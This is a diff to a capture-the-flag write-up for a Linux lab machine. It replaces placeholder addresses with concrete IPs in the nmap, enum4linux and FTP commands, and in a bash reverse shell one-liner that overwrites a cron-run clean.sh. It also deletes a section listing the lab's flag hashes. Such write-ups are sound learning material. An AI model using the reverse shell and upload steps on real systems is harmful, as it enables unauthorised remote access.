@@ -19,7 +19,7 @@ Linux machine combining FTP anonymous access, a writable script executed by the 
 ### Network Scanning
 
 ```bash
-nmap -sC -sV -T4 <target_ip>
+nmap -sC -sV -T4 10.63.142.87
 ```
 **Key findings**:
 
@@ -31,7 +31,7 @@ Although SMB enumeration was possible, it did not immediately provide a viable a
 
 ### SMB Enumeration (False Path)
 ```bash
-enum4linux <target_ip>
+enum4linux 10.63.142.87
 ```
 - Guest access confirmed
 - Shared resources accessible
@@ -43,7 +43,7 @@ Not every exposed service is a viable entry point. Enumeration should inform dec
 ## FTP Enumeration (Primary Attack Vector)
 Anonymous FTP Login
 ```bash
-ftp <target_ip>
+ftp 10.63.142.87
 ```
 Anonymous access revealed a writable directory containing scripts:
 
@@ -66,7 +66,7 @@ The existing `clean.sh` script was overwritten with a reverse shell payload:
 
 ```bash
 #!/bin/bash
-bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+bash -i >& /dev/tcp/10.63.108.42/4444 0>&1
 ```
 ### Upload via FTP
 ```
@@ -117,13 +117,6 @@ Privilege escalation successful.
 ```bash
 cd /root
 cat root.txt
-```
-
-## Flags
-
-```
-user.txt  -> 90d6f992585815ff991e68748c414740
-root.txt  -> 4d930091c31a622a7ed10f27999af363
 ```
 
 ## Key Takeaways
